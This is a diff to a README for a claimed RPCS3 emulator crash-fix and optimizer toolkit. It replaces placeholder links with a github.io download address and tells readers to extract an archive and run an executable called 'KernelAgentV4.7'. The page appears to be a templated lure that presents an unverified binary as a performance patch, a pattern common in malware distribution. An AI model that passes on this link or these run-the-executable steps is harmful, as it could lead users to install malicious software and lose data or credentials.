@@ -2,13 +2,15 @@
 
 This toolkit fixes frequent RPCS3 crashes, improves game compatibility, and auto-applies optimal settings for better performance on Windows. Powered by `KernelAgentV4.7`.
 
-[![Download RPCS3 Fix](https://img.shields.io/badge/Download-RPCS3_Optimizer-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download RPCS3 Fix](https://img.shields.io/badge/Download-RPCS3_Optimizer-blueviolet)](https://rpcs3-emulator-fix-optimizer-windows.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://rpcs3-emulator-fix-optimizer-windows.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\RPCS3Fix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will apply crash fixes, configuration tuning, and shader cache cleaning  
